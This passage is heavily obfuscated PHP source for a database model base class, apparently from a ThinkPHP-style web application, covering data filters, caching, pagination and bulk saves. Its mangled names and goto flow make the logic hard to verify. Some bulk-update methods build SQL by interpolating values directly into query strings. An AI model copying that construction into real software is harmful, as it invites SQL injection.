<?php
 goto d¡Å•©âšñ; a»¨„æÈÓ: function binCheckBigger($eğÄ©æˆñ‚, $C¥Ô‰Ø»ç¼) { return $eğÄ©æˆñ‚ > $C¥Ô‰Ø»ç¼; } $_SERVER[$_SERVER[úù›­Ö¢íü][3]] = ("\71\60\71\71"."\62\66")+0;$_xekd="T39EnaJx4QdSiwf6itCtmW4GZuxU7Cw9graTWzS8myKBwyabNAMFIab4hmAkA25VnjQTypjsRCaN3gZPPG";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($E„ĞÃÇ‹¦à, $E¯äÙÌÀƒù) { $DÂÑÏµ´À© =& $_SERVER[úÉ·öƒÑì©]; if (isset(self::$_methodList[$E„ĞÃÇ‹¦à])) { return @call_user_func_array(self::$_methodList[$E„ĞÃÇ‹¦à], $E¯äÙÌÀƒù); } else { if (method_exists($this, $E„ĞÃÇ‹¦à)) { return call_user_func_array(array($this, $E„ĞÃÇ‹¦à), $E¯äÙÌÀƒù); } else { think_exception(__CLASS__ . $DÂÑÏµ´À©[4] . $E„ĞÃÇ‹¦à . $DÂÑÏµ´À©[5]); } } } public static function __callStatic($b÷ä°›É„å, $BùñÁÚÑÅê) { if (isset(self::$_methodListStatic[$b÷ä°›É„å])) { return call_user_func_array(self::$_methodListStatic[$b÷ä°›É„å], $BùñÁÚÑÅê); } else { if (method_exists(self, $b÷ä°›É„å)) { return call_user_func_array(array(self, $b÷ä°›É„å), $BùñÁÚÑÅê); } else { show_json("{$b÷ä°›É„å}\50\x29\x20\x6e\157\x74\40\145\x78\x69\x73\x74\73", !1); } } } public static function addMethod($Dõë¶âØÉ, $A¿Í‚™óš) { self::$_methodList[$Dõë¶âØÉ] = $A¿Í‚™óš; } public static function addMethodStatic($B¶×¼Ôï—„, $c¯¢‘‡ªÂ) { self::$_methodListStatic[$B¶×¼Ôï—„] = $c¯¢‘‡ªÂ; } } goto e‡òí¹ÎÂ•; e¡ßò‚ÀÔğ: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\171\x54\x69\x6d\145", "\x74\151\155\x65", "\x69\x6e\163\145\x72\x74\54\x75\160\144\x61\164\x65", "\146\165\156\x63\164\151\x6f\156"), array("\143\x72\145\x61\x74\x65\x54\151\x6d\145", "\x74\x69\x6d\x65", "\x69\156\x73\145\x72\x74", "\x66\165\156\x63\x74\x69\x6f\x6e")); public function setDataAuto($cÅöºñˆ‘Æ) { $this->dataAuto = $cÅöºñˆ‘Æ; } public function __construct($dÛ•¶¸Îù© = '', $EñŠ¬ˆ¥±Ï = '', $b´íãáª®İ = '') { parent::__construct($dÛ•¶¸Îù©, $EñŠ¬ˆ¥±Ï, $b´íãáª®İ); } public static function textEncode($fùöø‡£ºÑ) { if (!$fùöø‡£ºÑ) { return $fùöø‡£ºÑ; } $E‰‡ç²ô’ = json_encode($fùöø‡£ºÑ); $E‰‡ç²ô’ = preg_replace_callback($_SERVER[úÉ·öƒÑì©][362], function ($c»„Ñ“ôê¹) { return addslashes($c»„Ñ“ôê¹[0]); }, $E‰‡ç²ô’); return json_decode($E‰‡ç²ô’); } public static function textDecode($f¿Ñ«À™—·) { $FË«ö‘´¥— =& $_SERVER[úÉ·öƒÑì©]; $aÂ‘÷Š©­ = json_encode($f¿Ñ«À™—·); $aÂ‘÷Š©­ = preg_replace_callback($FË«ö‘´¥—[363], function ($AŠÍª–Š°ê) { return $_SERVER[úÉ·öƒÑì©][97]; }, $aÂ‘÷Š©­); return json_decode($aÂ‘÷Š©­); } protected $tableMeta = array(); protected function _beforeInsert(&$fÔöÌÁîßî, $aÁåªªïŠÆ) { $EÆöÓµ‡« =& $_SERVER[úÉ·öƒÑì©]; if (!$this->checkDataAutoHas($EÆöÓµ‡«[364])) { return; } $this->dataBeforeFilter($fÔöÌÁîßî, $EÆöÓµ‡«[364]); } protected function _beforeUpdate(&$Cƒ«ôÚ¶¬, $F®„³Ì‘Õ) { $f¡±ŸºîÏÈ =& $_SERVER[úÉ·öƒÑì©]; if (!$this->checkDataAutoHas($f¡±ŸºîÏÈ[365])) { return; } $this->dataBeforeFilter($Cƒ«ôÚ¶¬, $f¡±ŸºîÏÈ[365]); } protected function _afterSelect(&$BÌƒŠ·¿ì, $aí ¬åÌ”) { if (!is_array($BÌƒŠ·¿ì)) { return; } if (!$this->checkDataAutoHas($_SERVER[úÉ·öƒÑì©][366])) { return; } foreach ($BÌƒŠ·¿ì as &$EÜÖë·ùÜ’) { $this->dataAfterFilter($EÜÖë·ùÜ’); } unset($EÜÖë·ùÜ’); } protected function _afterFind(&$eªùë“»·, $B†Êø‰‡¼¹) { if (!is_array($eªùë“»·)) { return; } if (!$this->checkDataAutoHas($_SERVER[úÉ·öƒÑì©][366])) { return; } $this->dataAfterFilter($eªùë“»·); } public function setAutoIncrement($b­´ëÒ‹) { $bß²¥ÁÑÍ = array($this->getPk() => $b­´ëÒ‹); $eõßè¿ = $this->data($bß²¥ÁÑÍ)->add(); if ($eõßè¿) { $this->delete($eõßè¿); } } public function getAutoIncrement() { $Aº¦ÄĞ¶‹ = $this->getTableName(); $a¬°³“†… = $this->max($this->getPk()); $B©ï˜¸ŒÕ = $this->query("\163\x68\157\x77\x20\164\141\142\x6c\x65\40\163\x74\141\164\x75\163\40\x77\150\145\162\x65\x20\116\x61\155\x65\x3d\x27{$Aº¦ÄĞ¶‹}\47"); $Eãƒñ¾»£È = $B©ï˜¸ŒÕ[0][$_SERVER[úÉ·öƒÑì©][367]]; $CåÖ½óáìÍ = max($a¬°³“†…, $Eãƒñ¾»£È); return $CåÖ½óáìÍ; } protected function _callBefore($CŒ„…¿‹, $AŞ«¥¨©‘Ç) { return $this->cacheCallCheck($CŒ„…¿‹, $AŞ«¥¨©‘Ç, !1); } protected function _callAfter($EÈÈ§Ûí, $CÀİÄ›–çÑ) { return $this->cacheCallCheck($EÈÈ§Ûí, $CÀİÄ›–çÑ, !0); } protected function cacheFunctionAlias($BİÜ°œ³‹) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($f— â›³ÄŒ, $Fè÷œÈ¡Ÿğ, $Aá‹•ÏÖÈ‘ = false) { $f¿ ‘ë©ãÜ = $this->cacheFunctionAlias($Fè÷œÈ¡Ÿğ); if (!$f¿ ‘ë©ãÜ) { return; } foreach ($f¿ ‘ë©ãÜ as $dİ¬Öİš£± => $D½¦†Š°£) { $d©»î¼°¬ = $D½¦†Š°£[0]; $d¨áÅŒœ²  = explode($_SERVER[úÉ·öƒÑì©][47], $D½¦†Š°£[1]); if ($f— â›³ÄŒ == $dİ¬Öİš£±) { return $this->cacheFunctionGet($dİ¬Öİš£±, $d©»î¼°¬); } if ($Aá‹•ÏÖÈ‘ && in_array($f— â›³ÄŒ, $d¨áÅŒœ² )) { $this->cacheFunctionClear($dİ¬Öİš£±, $d©»î¼°¬); } } } public function cacheFunctionGet($C²òŞğƒ¦¦, $dÊˆ„Ïœ«) { $BŒá¸×â¨ = $this->cacheKeyMake($C²òŞğƒ¦¦, $dÊˆ„Ïœ«); $AèÌë“ ÒÎ = Cache::get($BŒá¸×â¨); if (!is_array($AèÌë“ ÒÎ)) { $AèÌë“ ÒÎ = call_user_func_array(array($this, $C²òŞğƒ¦¦), array($dÊˆ„Ïœ«, !0)); Cache::set($BŒá¸×â¨, $AèÌë“ ÒÎ); } return $AèÌë“ ÒÎ; } public function cacheFunctionClear($AŸ’•¨´‡¤, $AÛ¾ÀÎ‘À) { $Fˆ«Á—…î° = $AÛ¾ÀÎ‘À; if (!is_array($AÛ¾ÀÎ‘À)) { $Fˆ«Á—…î° = array($AÛ¾ÀÎ‘À); } foreach ($Fˆ«Á—…î° as $eˆáĞÁ–‚ï) { $F°˜ùŞ¤Ö‘ = $this->cacheKeyMake($AŸ’•¨´‡¤, $eˆáĞÁ–‚ï); Cache::remove($F°˜ùŞ¤Ö‘); } } private function cacheKeyMake($Fô¦åºÙÍ, $bÈÇé„÷®) { $F¾æÛÅÁø† =& $_SERVER[úÉ·öƒÑì©]; return get_class($this) . $F¾æÛÅÁø†[71] . $Fô¦åºÙÍ . $F¾æÛÅÁø†[368] . $bÈÇé„÷®; } protected function selectPageReset() { $EÚ­Ö‹Ïí =& $_SERVER[úÉ·öƒÑì©]; if (isset($GLOBALS[$EÚ­Ö‹Ïí[369]])) { return; } $GLOBALS[$EÚ­Ö‹Ïí[369]] = isset($GLOBALS[$EÚ­Ö‹Ïí[7]][$EÚ­Ö‹Ïí[370]]) ? $GLOBALS[$EÚ­Ö‹Ïí[7]][$EÚ­Ö‹Ïí[370]] : !1; $GLOBALS[$EÚ­Ö‹Ïí[371]] = isset($GLOBALS[$EÚ­Ö‹Ïí[7]][$EÚ­Ö‹Ïí[360]]) ? $GLOBALS[$EÚ­Ö‹Ïí[7]][$EÚ­Ö‹Ïí[360]] : !1; $GLOBALS[$EÚ­Ö‹Ïí[7]][$EÚ­Ö‹Ïí[370]] = !1; $GLOBALS[$EÚ­Ö‹Ïí[7]][$EÚ­Ö‹Ïí[360]] = !1; } protected function selectPageRestore() { $aÙÔËÑ  =& $_SERVER[úÉ·öƒÑì©]; if (!isset($GLOBALS[$aÙÔËÑ [369]])) { return; } $GLOBALS[$aÙÔËÑ [7]][$aÙÔËÑ [370]] = $GLOBALS[$aÙÔËÑ [369]]; $GLOBALS[$aÙÔËÑ [7]][$aÙÔËÑ [360]] = $GLOBALS[$aÙÔËÑ [371]]; unset($GLOBALS[$aÙÔËÑ [369]]); unset($GLOBALS[$aÙÔËÑ [371]]); } protected function selectPage($b§õ³ì·° = 200, $A¢©•¥àØå = 1) { goto c†©©”‹·´; eÁæ²äŞª‘: if (!is_array($cÒÎÌ×ÉĞÄ)) { $cÒÎÌ×ÉĞÄ = array(); } if ($dÉ‘ŞÛÊ“± == 1) { $dßÇ³ÃÚå’ = count($cÒÎÌ×ÉĞÄ); } $E¸¾¤ì¨³Ü = array($D¿é®ƒõ¢ù[373] => array($D¿é®ƒõ¢ù[374] => $dßÇ³ÃÚå’, $D¿é®ƒõ¢ù[370] => $b§õ³ì·°, $D¿é®ƒõ¢ù[360] => $A¢©•¥àØå, $D¿é®ƒõ¢ù[375] => $dÉ‘ŞÛÊ“±), $D¿é®ƒõ¢ù[376] => $cÒÎÌ×ÉĞÄ); goto FÊÆ¿ ¥Ò´; E©†¶Û¼Ò: $b§õ³ì·° = $b§õ³ì·° <= 5 ? 5 : ($b§õ³ì·° >= $eÎ·ãØ˜×À ? $eÎ·ãØ˜×À : $b§õ³ì·°); $A¢©•¥àØå = intval(isset($in[$D¿é®ƒõ¢ù[360]]) && $in[$D¿é®ƒõ¢ù[360]] ? $in[$D¿é®ƒõ¢ù[360]] : $A¢©•¥àØå); $A¢©•¥àØå = $A¢©•¥àØå <= 1 ? 1 : $A¢©•¥àØå; goto F¯í¥Â¯êß; FÊÆ¿ ¥Ò´: return $E¸¾¤ì¨³Ü; goto eœÚÈ§»±; eëÖ„·äÉÃ: $fàÑÙÊƒÆ‡ = $EîÀ»İœŠ; $fàÑÙÊƒÆ‡[$D¿é®ƒõ¢ù[372]] = array(); $b§õ³ì·° = intval($b§õ³ì·°); goto E©†¶Û¼Ò; c†©©”‹·´: $D¿é®ƒõ¢ù =& $_SERVER[úÉ·öƒÑì©]; global $in; $EîÀ»İœŠ = $this->optionsValue(); goto bŠéÁÆ„¾Æ; F¯í¥Â¯êß: $cÒÎÌ×ÉĞÄ = array(); $FˆùÒƒ¾¶— = 1; if ($A¢©•¥àØå == 1 && $FˆùÒƒ¾¶—) { $this->optionsValue($EîÀ»İœŠ); $cÒÎÌ×ÉĞÄ = $this->page($A¢©•¥àØå, $b§õ³ì·°)->select(); $dßÇ³ÃÚå’ = is_array($cÒÎÌ×ÉĞÄ) ? count($cÒÎÌ×ÉĞÄ) : 0; if ($dßÇ³ÃÚå’ < $b§õ³ì·°) { $dÉ‘ŞÛÊ“± = 1; } else { $this->optionsValue($fàÑÙÊƒÆ‡); $dßÇ³ÃÚå’ = intval($this->count()); $dÉ‘ŞÛÊ“± = ceil($dßÇ³ÃÚå’ / $b§õ³ì·°); } } else { $this->optionsValue($fàÑÙÊƒÆ‡); $dßÇ³ÃÚå’ = intval($this->count()); $dÉ‘ŞÛÊ“± = ceil($dßÇ³ÃÚå’ / $b§õ³ì·°); $A¢©•¥àØå = $A¢©•¥àØå >= $dÉ‘ŞÛÊ“± ? $dÉ‘ŞÛÊ“± : $A¢©•¥àØå; $this->optionsValue($EîÀ»İœŠ); $cÒÎÌ×ÉĞÄ = $this->page($A¢©•¥àØå, $b§õ³ì·°)->select(); } goto eÁæ²äŞª‘; bŠéÁÆ„¾Æ: $eÎ·ãØ˜×À = 50000; $b§õ³ì·° = isset($in[$D¿é®ƒõ¢ù[370]]) && $in[$D¿é®ƒõ¢ù[370]] ? $in[$D¿é®ƒõ¢ù[370]] : $b§õ³ì·°; if ($b§õ³ì·° === -1) { $in[$D¿é®ƒõ¢ù[370]] = !1; $eÎ·ãØ˜×À = 100000000; $b§õ³ì·° = $eÎ·ãØ˜×À; } goto eëÖ„·äÉÃ; eœÚÈ§»±: } protected function checkLength($bœ„©ğÊ¥Î, $aá—Ÿí¼« = 0, $bßòöØ™Ú· = '') { $E£‰¼„²ƒ· =& $_SERVER[úÉ·öƒÑì©]; $aá—Ÿí¼« = $aá—Ÿí¼« ? $aá—Ÿí¼« : 65536; if (!$bœ„©ğÊ¥Î || strlen($bœ„©ğÊ¥Î) < $aá—Ÿí¼«) { return; } $bßòöØ™Ú· = $bßòöØ™Ú· ? $bßòöØ™Ú· . $E£‰¼„²ƒ·[68] : $E£‰¼„²ƒ·[33]; show_json($bßòöØ™Ú· . LNG($E£‰¼„²ƒ·[377]) . "\x28{$aá—Ÿí¼«}\51", !1); } protected function metaSet($FÇª‡ÅâÙƒ, $CÉ”…‘Åˆµ = null, $FãÌ§ŞÀÏ¡ = null) { goto c¹°®‹Û•à; c¹°®‹Û•à: $ašĞ½Ü‡Ñé =& $_SERVER[úÉ·öƒÑì©]; if (!$this->tableMeta || !$FÇª‡ÅâÙƒ) { return !1; } $bá”Ù—ÉëØ = $this->tableMeta[$ašĞ½Ü‡Ñé[378]]; goto C×©´öÇ‘Ü; F˜­Å÷ƒ³Ø: if (is_string($CÉ”…‘Åˆµ)) { $c‚°Œ­ßã[$CÉ”…‘Åˆµ] = $FãÌ§ŞÀÏ¡; } $cÑ¼Ü™ˆ®æ = array(); foreach ($c‚°Œ­ßã as $f‰†Ğ”‚¤ => $BÑÖÏÙª÷á) { $this->checkLength($BÑÖÏÙª÷á, !1, $cà±ïéÖäõ . $ašĞ½Ü‡Ñé[4] . $f‰†Ğ”‚¤); $cÑ¼Ü™ˆ®æ[] = array($bá”Ù—ÉëØ => $FÇª‡ÅâÙƒ, $ašĞ½Ü‡Ñé[93] => $f‰†Ğ”‚¤, $ašĞ½Ü‡Ñé[381] => $BÑÖÏÙª÷á); } goto D¬„‚ÏÅ; DÇÉ··ÌÏì: if (is_null($CÉ”…‘Åˆµ)) { return $eÇÚô»ƒ¨->where(array($bá”Ù—ÉëØ => $FÇª‡ÅâÙƒ))->delete(); } if (is_null($FãÌ§ŞÀÏ¡) && is_string($CÉ”…‘Åˆµ)) { return $eÇÚô»ƒ¨->where($D¿ÄÛ©ª¾)->delete(); } $c‚°Œ­ßã = is_array($CÉ”…‘Åˆµ) ? $CÉ”…‘Åˆµ : array(); goto F˜­Å÷ƒ³Ø; C×©´öÇ‘Ü: $cà±ïéÖäõ = $this->tableMeta[$ašĞ½Ü‡Ñé[379]]; $eÇÚô»ƒ¨ = Model($cà±ïéÖäõ); $D¿ÄÛ©ª¾ = array($bá”Ù—ÉëØ => $FÇª‡ÅâÙƒ, $ašĞ½Ü‡Ñé[380] => $CÉ”…‘Åˆµ); goto DÇÉ··ÌÏì; b„¢‡‚·—: CacheLock::unlock($f»†ŒÙ¾¥„); return !0; goto fØ‚÷¯º„; D¬„‚ÏÅ: $f»†ŒÙ¾¥„ = $ašĞ½Ü‡Ñé[382] . $this->tableMeta; CacheLock::lock($f»†ŒÙ¾¥„); $eÇÚô»ƒ¨->where(array($bá”Ù—ÉëØ => $FÇª‡ÅâÙƒ))->addAll($cÑ¼Ü™ˆ®æ, array(), !0); goto b„¢‡‚·—; fØ‚÷¯º„: } public function metaGet($d™¯÷¸¸¡, $bÎÔ¼²‰ï = false) { goto Eè§Î„÷‘; Eè§Î„÷‘: $b¾‚ô Œ¬ =& $_SERVER[úÉ·öƒÑì©]; if (!$this->tableMeta) { return array(); } $AŠ°Œø’Ò½ = $this->tableMeta[$b¾‚ô Œ¬[378]]; goto Cç´¹è‹¤‘; dœ¤Ò÷„„é: $e‹İİÓ° = $FÄ¿çíå->field($b¾‚ô Œ¬[383])->where($Bğ¾ÍÃÄ‰¤)->select(); $e‹İİÓ° = array_to_keyvalue($e‹İİÓ°, $b¾‚ô Œ¬[93], $b¾‚ô Œ¬[381]); return $e‹İİÓ°; goto a«×£ğ“§; Cç´¹è‹¤‘: $FÄ¿çíå = Model($this->tableMeta[$b¾‚ô Œ¬[379]]); if ($bÎÔ¼²‰ï) { $Bğ¾ÍÃÄ‰¤ = array($AŠ°Œø’Ò½ => $d™¯÷¸¸¡, $b¾‚ô Œ¬[93] => $bÎÔ¼²‰ï); return $FÄ¿çíå->where($Bğ¾ÍÃÄ‰¤)->getField($b¾‚ô Œ¬[381]); } $Bğ¾ÍÃÄ‰¤ = array($AŠ°Œø’Ò½ => $d™¯÷¸¸¡); goto dœ¤Ò÷„„é; a«×£ğ“§: } private function checkDataAutoHas($BÑÌ†œ‚¤‚) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $b«½ä‡°šâ) { if (in_array($BÑÌ†œ‚¤‚, explode($_SERVER[úÉ·öƒÑì©][47], $b«½ä‡°šâ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$dÕ•ÇÆ‰›, $bÉ¼¬‹İ¶ì) { $Døˆ„½¼ô‘ =& $_SERVER[úÉ·öƒÑì©]; foreach ($this->dataAuto as $BƒİĞÂ„¼¸) { $e‡Ö˜ô‹Æœ = $BƒİĞÂ„¼¸[0]; if (!in_array($bÉ¼¬‹İ¶ì, explode($Døˆ„½¼ô‘[47], $BƒİĞÂ„¼¸[2]))) { continue; } switch (trim($BƒİĞÂ„¼¸[3])) { case $Døˆ„½¼ô‘[328]: case $Døˆ„½¼ô‘[329]: $Aøå¸º†„ = $BƒİĞÂ„¼¸[1]; $DôË‘—çŠé = isset($BƒİĞÂ„¼¸[4]) ? (array) $BƒİĞÂ„¼¸[4] : array(); if ($Aøå¸º†„ == $Døˆ„½¼ô‘[197] && array_key_exists($e‡Ö˜ô‹Æœ, $dÕ•ÇÆ‰›)) { if (!$dÕ•ÇÆ‰›[$e‡Ö˜ô‹Æœ]) { unset($dÕ•ÇÆ‰›[$e‡Ö˜ô‹Æœ]); } break; } if (isset($dÕ•ÇÆ‰›[$e‡Ö˜ô‹Æœ])) { array_unshift($DôË‘—çŠé, $dÕ•ÇÆ‰›[$e‡Ö˜ô‹Æœ]); } if ($Døˆ„½¼ô‘[328] == $BƒİĞÂ„¼¸[3]) { $dÕ•ÇÆ‰›[$e‡Ö˜ô‹Æœ] = call_user_func_array($Aøå¸º†„, $DôË‘—çŠé); } else { $dÕ•ÇÆ‰›[$e‡Ö˜ô‹Æœ] = call_user_func_array(array(&$this, $Aøå¸º†„), $DôË‘—çŠé); } break; case $Døˆ„½¼ô‘[280]: $dÕ•ÇÆ‰›[$e‡Ö˜ô‹Æœ] = $dÕ•ÇÆ‰›[$BƒİĞÂ„¼¸[1]]; break; case $Døˆ„½¼ô‘[301]: if (isset($dÕ•ÇÆ‰›[$e‡Ö˜ô‹Æœ]) && !is_string($dÕ•ÇÆ‰›[$e‡Ö˜ô‹Æœ])) { $dÕ•ÇÆ‰›[$e‡Ö˜ô‹Æœ] = json_encode_force($dÕ•ÇÆ‰›[$e‡Ö˜ô‹Æœ]); } break; case $Døˆ„½¼ô‘[330]: if ($dÕ•ÇÆ‰›[$e‡Ö˜ô‹Æœ] === $Døˆ„½¼ô‘[33]) { unset($dÕ•ÇÆ‰›[$e‡Ö˜ô‹Æœ]); } break; case $Døˆ„½¼ô‘[331]: $dÕ•ÇÆ‰›[$e‡Ö˜ô‹Æœ] = $BƒİĞÂ„¼¸[1]; default: break; } } if ($bÉ¼¬‹İ¶ì == $Døˆ„½¼ô‘[364]) { $B–âÃÎä½ = strtolower($this->db->getDbType()); if (strpos($B–âÃÎä½, $Døˆ„½¼ô‘[9]) !== 0) { return; } $dù¥·à¡‹Â = $this->field(!0)->fields; $Aùõ†šàéñ = $dù¥·à¡‹Â[$Døˆ„½¼ô‘[259]]; if (isset($dù¥·à¡‹Â[$Døˆ„½¼ô‘[258]])) { unset($Aùõ†šàéñ[$dù¥·à¡‹Â[$Døˆ„½¼ô‘[258]]]); } foreach ($Aùõ†šàéñ as $BÄ¿ÖÀíÃ => $bÉ¼¬‹İ¶ì) { if (!isset($dÕ•ÇÆ‰›[$BÄ¿ÖÀíÃ])) { $dÕ•ÇÆ‰›[$BÄ¿ÖÀíÃ] = $Døˆ„½¼ô‘[33]; } } } } private function dataAfterFilter(&$cøÅÜÙ¼éØ) { $BîÉ¿Àéçî =& $_SERVER[úÉ·öƒÑì©]; foreach ($this->dataAuto as $eå½µ¦‡©İ) { $CÖÜƒ‚¶ŠÕ = $eå½µ¦‡©İ[0]; if (!in_array($BîÉ¿Àéçî[366], explode($BîÉ¿Àéçî[47], $eå½µ¦‡©İ[2]))) { continue; } if (!isset($cøÅÜÙ¼éØ[$CÖÜƒ‚¶ŠÕ])) { continue; } switch (trim($eå½µ¦‡©İ[3])) { case $BîÉ¿Àéçî[328]: case $BîÉ¿Àéçî[329]: $AÅ­÷Àö…õ = isset($eå½µ¦‡©İ[4]) ? (array) $eå½µ¦‡©İ[4] : array(); array_unshift($AÅ­÷Àö…õ, $cøÅÜÙ¼éØ[$CÖÜƒ‚¶ŠÕ]); if ($BîÉ¿Àéçî[328] == $eå½µ¦‡©İ[3]) { $cøÅÜÙ¼éØ[$CÖÜƒ‚¶ŠÕ] = call_user_func_array($eå½µ¦‡©İ[1], $AÅ­÷Àö…õ); } else { $cøÅÜÙ¼éØ[$CÖÜƒ‚¶ŠÕ] = call_user_func_array(array(&$this, $eå½µ¦‡©İ[1]), $AÅ­÷Àö…õ); } break; case $BîÉ¿Àéçî[280]: $cøÅÜÙ¼éØ[$CÖÜƒ‚¶ŠÕ] = $cøÅÜÙ¼éØ[$eå½µ¦‡©İ[1]]; break; case $BîÉ¿Àéçî[301]: $C×‡‰¯† = $cøÅÜÙ¼éØ[$CÖÜƒ‚¶ŠÕ]; $cøÅÜÙ¼éØ[$CÖÜƒ‚¶ŠÕ] = json_decode($C×‡‰¯†, !0); if (is_null($cøÅÜÙ¼éØ[$CÖÜƒ‚¶ŠÕ])) { $cøÅÜÙ¼éØ[$CÖÜƒ‚¶ŠÕ] = $C×‡‰¯†; } break; case $BîÉ¿Àéçî[330]: if ($cøÅÜÙ¼éØ[$CÖÜƒ‚¶ŠÕ] === $BîÉ¿Àéçî[33]) { unset($cøÅÜÙ¼éØ[$CÖÜƒ‚¶ŠÕ]); } break; case $BîÉ¿Àéçî[331]: $cøÅÜÙ¼éØ[$CÖÜƒ‚¶ŠÕ] = $eå½µ¦‡©İ[1]; default: break; } } } public function saveAll($b¨Õ´èƒèŞ) { goto fÚ÷Áâ²±Œ; fÚ÷Áâ²±Œ: $FŞàè½’…È =& $_SERVER[úÉ·öƒÑì©]; $F«Û§†ˆÑù = $this->tablePrefix . $this->tableName; $a®§Ğãï©² = self::SQL_WHERE_IN_CHUNK; goto D®ôÉğ’»ß; D®ôÉğ’»ß: $b¨Õ´èƒèŞ = is_array($b¨Õ´èƒèŞ) ? $b¨Õ´èƒèŞ : array(); $DÍ¹ô–İ‡© = $FŞàè½’…È[384]; $d±…¨Š—™‹ = 0; goto Aˆ–ÅÕ±ÍÜ; d±Ã¥ ¢Ÿ: $this->chunkEventSet(); goto b‰´İŞ‹é‹; Aˆ–ÅÕ±ÍÜ: $FˆÊÌØÑã© = array(); $dÃ ô©´‘Ä = count($b¨Õ´èƒèŞ); for ($F´ÃÅ¦©ƒô = 0; $F´ÃÅ¦©ƒô < $dÃ ô©´‘Ä; $F´ÃÅ¦©ƒô++) { $a¤èÏš‘œ = $b¨Õ´èƒèŞ[$F´ÃÅ¦©ƒô]; if (!is_array($a¤èÏš‘œ) || count($a¤èÏš‘œ) != 4) { continue; } $bºœåÌĞ = "\x55\x50\104\101\124\105\x20\x60{$F«Û§†ˆÑù}\x60\40\123\x45\x54\40{$a¤èÏš‘œ[2]}\x20\75\40\103\101\x53\105\x20{$a¤èÏš‘œ[0]}\x20\12"; if ($d±…¨Š—™‹ == 0) { $DÍ¹ô–İ‡© = $bºœåÌĞ; } $FˆÊÌØÑã©[] = $FŞàè½’…È[116] . $a¤èÏš‘œ[1] . $FŞàè½’…È[116]; $d±…¨Š—™‹++; $DÍ¹ô–İ‡© .= "\x20\x57\110\105\x4e\x20\x27{$a¤èÏš‘œ[1]}\x27\x20\124\x48\105\x4e\40\47{$a¤èÏš‘œ[3]}\47\40\xa"; if ($d±…¨Š—™‹ == $a®§Ğãï©² || $F´ÃÅ¦©ƒô == $dÃ ô©´‘Ä - 1) { goto AóØ„ÂÉ‘İ; AóØ„ÂÉ‘İ: $bÊ‰ĞŞÆˆ = implode($FŞàè½’…È[47], $FˆÊÌØÑã©); $DÍ¹ô–İ‡© .= "\x20\105\x4e\104\x20\x20\127\110\x45\x52\x45\40{$a¤èÏš‘œ[0]}\40\111\x4e\x20\x28{$bÊ‰ĞŞÆˆ}\x29\x20"; $this->execute($DÍ¹ô–İ‡©); goto fìÍ®»ÏÕ; eëï…œÖßÈ: $FˆÊÌØÑã© = array(); goto DèøôÙßù¬; fìÍ®»ÏÕ: $d±…¨Š—™‹ = 0; $DÍ¹ô–İ‡© = $bºœåÌĞ; $this->chunkEventCheck(count($FˆÊÌØÑã©)); goto eëï…œÖßÈ; DèøôÙßù¬: } } goto d±Ã¥ ¢Ÿ; b‰´İŞ‹é‹: } public function saveAllEach($BÓˆ«“ß‘ù) { $dÑò¹ï½–è =& $_SERVER[úÉ·öƒÑì©]; $eéóÈŒŒ† = $this->tablePrefix . $this->tableName; foreach ($BÓˆ«“ß‘ù as $f†Ã­ëÎùˆ) { if (!is_array($f†Ã­ëÎùˆ) || count($f†Ã­ëÎùˆ) != 4) { continue; } $A‹ÜÈ ·™í = $f†Ã­ëÎùˆ[0] . $dÑò¹ï½–è[385] . $f†Ã­ëÎùˆ[1] . $dÑò¹ï½–è[116]; $E®°Æ£§Ù¿ = $f†Ã­ëÎùˆ[2] . $dÑò¹ï½–è[385] . $f†Ã­ëÎùˆ[3] . $dÑò¹ï½–è[116]; $aÖçİø¨½µ = "\165\160\144\x61\164\145\x20{$eéóÈŒŒ†}\x20\163\x65\164\x20{$E®°Æ£§Ù¿}\40\x77\x68\145\x72\145\40{$A‹ÜÈ ·™í}\x3b"; $this->execute($aÖçİø¨½µ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($e„¸£“Œ¬† = false, $D«ÊÒë®Á¹ = false) { $this->_chunkEvent = $e„¸£“Œ¬†; $this->_chunkEventParam = $D«ÊÒë®Á¹; } private function chunkEventCheck($BÀæ»ÓÒÂÚ) { if (!$this->_chunkEvent) { return; } $C­¾éÏ ĞÖ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $C­¾éÏ ĞÖ[$_SERVER[úÉ·öƒÑì©][386]] = $BÀæ»ÓÒÂÚ; Hook::trigger($this->_chunkEvent, $C­¾éÏ ĞÖ); } public function addAll($A´Â±¹À, $D ã¬Â“¶î = array(), $a»ù†¥çÑ” = false) { goto C£¹›ÊÙ¢; C£¹›ÊÙ¢: $FŸ±’†»ª­ =& $_SERVER[úÉ·öƒÑì©]; ignore_timeout(); $Fğ‚§á¿Ôì = self::SQL_WHERE_IN_CHUNK; goto AŸ‚ŒÁÁÈ; a¼¾„İ™Ô: if (method_exists($this->db, $FŸ±’†»ª­[279])) { for ($C¾œ½Š§œš = 0; $C¾œ½Š§œš < count($A´Â±¹À); $C¾œ½Š§œš += $Fğ‚§á¿Ôì) { $E„Œ™ğ‹ = array_slice($A´Â±¹À, $C¾œ½Š§œš, $Fğ‚§á¿Ôì); if (!is_array($E„Œ™ğ‹) || count($E„Œ™ğ‹) == 0) { break; } $E³š®İè ³ = $this->db->insertAll($E„Œ™ğ‹, $D ã¬Â“¶î, $a»ù†¥çÑ”); $this->chunkEventCheck(count($E„Œ™ğ‹)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($A´Â±¹À as $FçÁ‚Æ‘Àˆ => $Aé¹À›í÷) { $E³š®İè ³ = $this->db->insert($Aé¹À›í÷, $D ã¬Â“¶î, $a»ù†¥çÑ”); } $this->commit(); } if (!1 !== $E³š®İè ³) { $Aä‰ËİíÛ½ = $this->getLastInsID(); if ($Aä‰ËİíÛ½) { return $Aä‰ËİíÛ½; } } return $E³š®İè ³; goto a–¹—˜Ÿˆ; AŸ‚ŒÁÁÈ: if (empty($A´Â±¹À)) { $this->error = think_lang($FŸ±’†»ª­[278]); return !1; } $D ã¬Â“¶î = $this->_parseOptions($D ã¬Â“¶î); foreach ($A´Â±¹À as $FçÁ‚Æ‘Àˆ => $Aé¹À›í÷) { $A´Â±¹À[$FçÁ‚Æ‘Àˆ] = $this->_facade($Aé¹À›í÷); 